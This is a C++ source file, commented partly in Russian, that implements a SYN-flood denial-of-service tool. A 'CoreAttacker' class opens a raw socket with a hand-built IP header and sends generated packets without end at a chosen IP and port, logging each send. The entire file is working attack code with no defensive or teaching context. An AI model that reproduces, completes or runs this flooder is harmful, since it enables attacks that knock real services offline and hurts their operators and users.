#include "attacker.hpp"
#include "packet.hpp"          
#include <iostream>           
#include <sys/socket.h>       
#include <netinet/in.h>       
#include <netinet/ip.h>        
#include <arpa/inet.h>         
#include <unistd.h>            
#include <stdexcept>

CoreAttacker::CoreAttacker(const TargetInfo& target)
    : target_(target) 
{
    create_raw_socket();
    set_socket_options();
}

// Создание Сырого Сокета
void CoreAttacker::create_raw_socket() {
    this->raw_socket_fd_ = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    
    if (this->raw_socket_fd_ < 0) {
        throw std::runtime_error("Failed to create raw socket. Try running with 'sudo'.");
    }
    std::cout << "Raw socket created successfully (FD: " << this->raw_socket_fd_ << ")" << std::endl;
}

void CoreAttacker::set_socket_options() {
    int one = 1;
    const int* val = &one;
    
    if (setsockopt(this->raw_socket_fd_, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        throw std::runtime_error("Failed to set IP_HDRINCL option.");
    }
}

void CoreAttacker::start_flood() {
    PacketGenerator generator(target_);
    
    // Адрес назначения
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_.port); 
    // inet_addr: преобразует IP-строку в сетевой 32-битный формат
    target_addr.sin_addr.s_addr = inet_addr(target_.ip.c_str());

    std::cout << "Starting SYN flood attack on " << target_.ip << ":" << target_.port << "..." << std::endl;
    
    while (true) {
        std::vector<char> raw_packet = generator.get_raw_packet();
        
        // Отправка пакета
        ssize_t sent_bytes = sendto(
            this->raw_socket_fd_,                   //  сырой сокет
            raw_packet.data(),                      // Указатель на начало буфера
            raw_packet.size(),                      // Размер пакета
            0,                                      // Флаги (0)
            (struct sockaddr*)&target_addr,         // Адрес назначения
            sizeof(target_addr)                     // Размер адреса
        );

        if (sent_bytes < 0) {
            std::cerr << "Error sending packet! (May be temporary)" << std::endl;
        } else {
             std::cout << "Sent " << sent_bytes << " bytes." << std::endl;
        }
        
    }
    
}
